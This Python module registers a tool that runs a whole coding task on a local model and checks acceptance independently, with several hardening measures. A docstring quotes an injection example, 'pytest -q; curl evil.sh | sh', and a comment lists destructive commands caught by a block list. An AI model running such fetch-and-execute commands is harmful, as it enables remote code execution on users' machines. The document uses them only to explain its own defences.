"""A whole task, owned by a local model, verified by something that is not it.

The prompt-time agent loop answers a PROMPT: it runs inside UserPromptSubmit,
before Claude's turn begins, bounded at 90 seconds, and hands back text. That
shape cannot absorb the thing that actually costs money — one Claude prompt
becoming several hundred tool calls, each one a full turn re-reading a large
context.

This tool inverts it. Claude submits an objective once and reads one result.
Every read, edit and command in between happens locally and never enters
Claude's context at all. Ten tool calls become one turn instead of ten.

Three properties are load-bearing, and each exists because of a measured failure:

1.  **A typed terminal status, never a hopeful string.** The loop returns
    "Agent reached maximum iterations. Partial work may have been done." when it
    runs out of turns, and `direct_executor.quality_ok` accepts that — it checks
    length and refusal phrases. In a benchmark on 2026-09-12 that exact string
    was scored as a pass. Here, exhaustion is `incomplete`, and it can never be
    `verified_complete`.

2.  **Acceptance is checked by the supervisor, not the worker.** The model that
    did the work does not get to grade it. The check is a command supplied by
    the caller, run in a subprocess after the loop has finished. The same
    benchmark measured the local model diagnosing a bug correctly in prose and
    never changing the code — self-report would have called that done.

3.  **No cloud fallback, ever.** If Ollama is unreachable or the budget is
    exhausted, this returns a typed failure with whatever was staged. Falling
    back to a paid model would make the cost saving unmeasurable and silently
    reintroduce the thing the tool exists to avoid.

Scope: this is the task-service core — bounded execution and honest reporting.
It is not the sandbox. Commands run with the caller's own privileges under
`agent_writes`' allowlist, so `workdir` must be a directory the caller is
willing to have modified. `docs/PROPOSAL_LOCAL_EXECUTION.md` describes the
confinement work this deliberately does not yet do.
"""
from __future__ import annotations

import hashlib
import json
import os
import re
import shlex
import subprocess
import time
from pathlib import Path

from llm_router import trace as _trace

# Terminal statuses. `verified_complete` is the ONLY one that means the work is
# done, and it requires an acceptance check that actually ran and passed.
VERIFIED_COMPLETE = "verified_complete"   # check supplied, ran, passed
PROPOSED = "proposed"                     # work staged, no check supplied to prove it
INCOMPLETE = "incomplete"                 # budget or iterations exhausted
FAILED_CHECK = "failed_check"             # check supplied, ran, failed
BLOCKED = "blocked"                       # could not start: no model, bad workdir
FAILED = "failed"                         # the loop raised

_EXHAUSTION_MARKERS = (
    "reached maximum iterations",
    "partial work may have been done",
)

_NOISE = {"__pycache__", ".pytest_cache", ".git", ".DS_Store", ".ruff_cache", ".mypy_cache"}

DEFAULT_BUDGET_S = 600.0
DEFAULT_MODEL = "qwen3-coder:30b"


# A snapshot exists to tell which files the run CHANGED. It does not need to
# hash the world to do that. `rglob("*")` with a six-entry noise set descends into
# .venv, node_modules, build output and any other repo vendored under the root —
# on a real project that is minutes of hashing before the model is even called,
# and it is unbounded in both file count and bytes.
_SNAPSHOT_MAX_FILES = 4000
_SNAPSHOT_MAX_BYTES = 8 * 1024 * 1024
_SKIP_DIRS = {
    "__pycache__", ".pytest_cache", ".git", ".ruff_cache", ".mypy_cache",
    ".venv", "venv", "node_modules", ".tox", ".next", ".cache", "dist",
    "build", "target", ".gradle", ".terraform", "site-packages",
}


def _snapshot(root: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    budget = _SNAPSHOT_MAX_BYTES
    for dirpath, dirnames, filenames in os.walk(root):
        # Prune in place so os.walk never descends into them at all — the reason
        # this is os.walk and not rglob.
        dirnames[:] = [d for d in dirnames
                       if d not in _SKIP_DIRS and d not in _NOISE and not d.startswith(".")
                       or d in (".github",)]
        for name in filenames:
            if name in _NOISE or name.startswith("."):
                continue
            p = Path(dirpath) / name
            try:
                size = p.stat().st_size
            except OSError:
                continue
            if size > budget or len(out) >= _SNAPSHOT_MAX_FILES:
                # Stop rather than truncate silently into a wrong answer: a
                # partial snapshot would report files as unchanged that were
                # never looked at.
                return out
            try:
                out[str(p.relative_to(root))] = hashlib.sha256(p.read_bytes()).hexdigest()
                budget -= size
            except OSError:
                continue
    return out


def _changed(before: dict[str, str], after: dict[str, str]) -> list[str]:
    return sorted(k for k in set(before) | set(after) if before.get(k) != after.get(k))


def _git_state(root: Path) -> dict[str, str] | None:
    """Dirty paths -> content digest, via `git status`; None if not a git repo.

    The os.walk snapshot is capped at _SNAPSHOT_MAX_FILES, and the cap is hit in
    walk order, so on a real repo files late in the walk (src/ after tests/ and
    docs/) were never compared and `changed_files` came back [] after a real
    edit (observed 2026-10-08). git enumerates the working tree itself, honours
    .gitignore, and has no file cap. The digest keeps a file that was already
    dirty before the run from being reported unless the run changed it again.
    """
    # Fixed minimal env: git needs PATH only, and must not see the operator's keys.
    env = {"PATH": os.environ.get("PATH", os.defpath), "LC_ALL": "C"}
    try:
        r = subprocess.run(
            ["git", "status", "--porcelain=v1", "-z", "--untracked-files=all", "--", "."],
            cwd=str(root), capture_output=True, timeout=60, env=env,
        )
        top = subprocess.run(["git", "rev-parse", "--show-prefix"], cwd=str(root),
                             capture_output=True, text=True, timeout=10, env=env)
    except Exception:                                          # noqa: BLE001
        return None
    if r.returncode != 0 or top.returncode != 0:
        return None
    prefix = top.stdout.strip()          # root's path inside the repo, "" at top level
    out: dict[str, str] = {}
    entries = r.stdout.decode("utf-8", "surrogateescape").split("\0")
    i = 0
    while i < len(entries):
        e = entries[i]
        i += 1
        if len(e) < 4:
            continue
        status, path = e[:2], e[3:]
        if status[0] in "RC":            # rename/copy: next entry is the source path
            i += 1
        rel = path[len(prefix):] if prefix and path.startswith(prefix) else path
        p = root / rel
        try:
            digest = hashlib.sha256(p.read_bytes()).hexdigest() if p.is_file() else "absent"
        except OSError:
            digest = "unreadable"
        out[rel] = f"{status}:{digest}"
    return out


_SHELL_TOKENS = {";", "|", "||", "&&", "&", ">", ">>", "<", "<<", "2>", "2>&1", "&>"}
_ENV_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SHELL_REJECTED = (
    "acceptance check uses shell syntax ({what}), but it is run WITHOUT a shell "
    "(argv only; this is deliberate, see test_local_task_authority). Put the "
    "command in an executable script and pass the script's path as "
    "acceptance_check, e.g. a check.sh containing `HOME=$(mktemp -d) pytest -q`."
)


def _shell_syntax(argv: list[str]) -> str | None:
    """Name the first shell construct in a string-derived argv, else None."""
    if argv and _ENV_ASSIGN.match(argv[0]):
        return f"environment assignment {argv[0].split('=', 1)[0]}="
    for tok in argv:
        if tok in _SHELL_TOKENS:
            return f"operator {tok!r}"
        if "$(" in tok or "`" in tok:
            return "command substitution"
    return None


def _run_check(check: str | list[str], cwd: Path, timeout: float) -> tuple[bool, str]:
    """Run the caller's acceptance check. Its exit code is the verdict.

    Deliberately a subprocess and not something the worker can influence: the
    whole point is that the model which did the work does not grade it.

    NO SHELL. This ran `subprocess.run(check, shell=True, ...)` until 2026-09-14,
    which made one string on an MCP tool call a general command-injection
    primitive — `pytest -q; curl evil.sh | sh` is two commands, and nothing
    sanitised it. `run_command` inside the agent loop had the right pattern all
    along (agent_loop.py: shlex.split + shell=False); this now matches it.

    A string is still accepted and split with `shlex`, so existing callers keep
    working, but shell METACHARACTERS no longer mean anything. Since 2026-10-08
    a string that contains them (NAME=value prefix, `;`, `|`, `&&`, `$(...)`,
    redirection) is rejected with an explicit message instead of being run as
    literal arguments, which failed with a bare FileNotFoundError. The fix for
    the caller is a script: the check is argv, a script path is argv.
    """
    if isinstance(check, (list, tuple)):
        argv = list(check)
    else:
        try:
            argv = shlex.split(check or "")
        except ValueError as exc:
            return False, f"acceptance check could not be parsed: {exc}"
        # A string is only split, never interpreted. Shell syntax therefore
        # cannot work; say so up front instead of failing with a bare
        # FileNotFoundError on "HOME=$(mktemp" (observed 2026-10-08).
        what = _shell_syntax(argv)
        if what:
            return False, _SHELL_REJECTED.format(what=what)
    if not argv:
        return False, "acceptance check was empty"
    try:
        # R4: `argv` comes from a caller-supplied `check` string, so this
        # executes model-influenced commands and must not hand them the
        # operator's credentials. Same reasoning as agent_loop; fail-closed.
        try:
            from llm_router.safe_subprocess import get_delegated_env
            _child_env = get_delegated_env()
        except Exception:  # noqa: BLE001
            _child_env = {"PATH": os.defpath}
        r = subprocess.run(argv, capture_output=True, text=True,
                           cwd=str(cwd), timeout=max(1.0, timeout),
                           env=_child_env)
    except subprocess.TimeoutExpired:
        return False, f"acceptance check timed out after {timeout:.0f}s"
    except Exception as exc:                                   # noqa: BLE001
        return False, f"acceptance check could not run: {type(exc).__name__}: {exc}"
    tail = ((r.stdout or "") + (r.stderr or ""))[-2000:]
    return r.returncode == 0, tail


async def llm_local_task(
    objective: str,
    workdir: str,
    acceptance_check: str | None = None,
    model: str = DEFAULT_MODEL,
    budget_s: float = DEFAULT_BUDGET_S,
    apply_writes: bool = False,
) -> str:
    """Run a whole multi-step task on a local model and report a typed result.

    Args:
        objective: What to accomplish. Written for a model that will read the
            repo itself — describe the goal, not the steps.
        workdir: The directory the task operates in. Files here may be modified.
        acceptance_check: A command that exits 0 when the objective is met,
            given as an argv list or a plain string (e.g.
            ``python3 -m pytest tests -q``). It is run WITHOUT a shell: for
            env assignments, ``$(...)``, pipes, ``;``, ``&&`` or redirection,
            put them in an executable script and pass its path; shell syntax in
            a string is rejected with an error. Without one the result
            can never be ``verified_complete`` — an unverified success is
            reported as ``proposed``, because nothing established that it works.
        model: Ollama model to drive the loop.
        budget_s: Wall-clock ceiling for the whole task, check included.
        apply_writes: Whether edits reach disk. Defaults to False since
            2026-09-14: True ALSO set LLM_ROUTER_AGENT_COMMANDS=all, and
            agent_writes.guard_command returns True immediately under `all`,
            skipping the entire inspection allowlist. What remained was a regex
            catching `rm -rf /`, `mkfs`, `dd` and `curl|sh` — not `cp`, `mv`,
            `tee` or `git`. Writes themselves are confined to project_root by
            agent_loop._resolve_path; run_command arguments are not. A tool whose
            default grants that much authority is one granted by accident.
            False leaves the loop in its
            default ``propose`` mode, where it computes diffs and changes
            nothing.

    Returns:
        A JSON object with ``status`` (one of the module's terminal statuses),
        ``changed_files``, ``check_passed``, ``check_output``, ``elapsed_s``
        and the model's own final ``report``. The report is the worker's
        account of what it did and is never evidence on its own.
    """
    started = time.monotonic()
    root = Path(workdir).expanduser()
    if not root.is_dir():
        return json.dumps({
            "status": BLOCKED,
            "reason": f"workdir is not a directory: {workdir}",
            "changed_files": [], "check_passed": None, "elapsed_s": 0.0,
        })

    try:
        from llm_router.hooks.agent_loop import run_agent_loop
    except ImportError as exc:                                 # noqa: BLE001
        return json.dumps({
            "status": BLOCKED,
            "reason": f"local agent loop unavailable: {exc}",
            "changed_files": [], "check_passed": None, "elapsed_s": 0.0,
        })

    # Scoped to this call. The `propose` default is right for a hook that fires
    # on every prompt; a caller who submitted a task and named a workdir has
    # asked for the work to happen.
    prev_writes = os.environ.get("LLM_ROUTER_AGENT_WRITES")
    prev_cmds = os.environ.get("LLM_ROUTER_AGENT_COMMANDS")
    if apply_writes:
        os.environ["LLM_ROUTER_AGENT_WRITES"] = "apply"
        # Applying WRITES must not also unlock arbitrary COMMANDS. These were
        # raised together, so asking for an edit on disk silently bought the
        # whole allowlist as well. Set LLM_ROUTER_AGENT_COMMANDS deliberately if
        # that is really wanted.

    try:
        from llm_router.context_injection import inject
        objective = inject(objective, root=str(root))
    except Exception:                                        # noqa: BLE001
        pass

    git_before = _git_state(root)
    before = _snapshot(root) if git_before is None else {}
    _trace.emit("task.start", objective=objective, workdir=str(root),
                model=model, budget_s=budget_s, apply_writes=apply_writes,
                acceptance_check=acceptance_check, files_before=len(git_before if git_before is not None else before))
    report, error = None, None
    try:
        report = run_agent_loop(
            prompt=objective,
            model=model,
            project_root=root,
            timeout_per_call=90,
            deadline_s=budget_s,
        )
    except Exception as exc:                                   # noqa: BLE001
        error = f"{type(exc).__name__}: {exc}"
    finally:
        for key, prev in (("LLM_ROUTER_AGENT_WRITES", prev_writes),
                          ("LLM_ROUTER_AGENT_COMMANDS", prev_cmds)):
            if prev is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = prev

    if git_before is not None:
        # git vanishing mid-run is the only way this is None; report nothing
        # rather than invent a baseline.
        git_after = _git_state(root)
        changed = _changed(git_before, git_after) if git_after is not None else []
    else:
        changed = _changed(before, _snapshot(root))
    elapsed = time.monotonic() - started

    if error is not None:
        status, check_passed, check_out = FAILED, None, ""
    else:
        text = (report or "").lower()
        exhausted = any(m in text for m in _EXHAUSTION_MARKERS)
        remaining = budget_s - elapsed
        if acceptance_check and remaining > 0:
            ok, check_out = _run_check(acceptance_check, root, remaining)
            check_passed = ok
            # Exhaustion loses to a passing check: if the objective is
            # demonstrably met, how many turns it took is not interesting.
            status = VERIFIED_COMPLETE if ok else (INCOMPLETE if exhausted else FAILED_CHECK)
        elif acceptance_check:
            status, check_passed, check_out = INCOMPLETE, None, "no budget left to run the check"
        else:
            # No check means nothing proved this works. Never claim it did.
            status, check_passed, check_out = (INCOMPLETE if exhausted else PROPOSED), None, ""

    _trace.emit("task.end", status=status, changed_files=changed,
                check_passed=check_passed, elapsed_s=round(elapsed, 1),
                error=error, report=report)
    return json.dumps({
        "status": status,
        "model": f"ollama/{model}",
        "changed_files": changed,
        "check_passed": check_passed,
        "check_output": check_out[-1500:] if check_out else "",
        "elapsed_s": round(elapsed, 1),
        "budget_s": budget_s,
        "writes_applied": bool(apply_writes),
        "error": error,
        "report": (report or "")[:1500],
        "note": (
            "`report` is the worker's own account and is not evidence. "
            "Only `status == 'verified_complete'` means an independent check ran and passed."
        ),
    }, indent=2)


def register(mcp, should_register=None) -> None:
    """Register llm_local_task, honouring the slim-surface gate."""
    if should_register is None or should_register("llm_local_task"):
        mcp.tool()(llm_local_task)
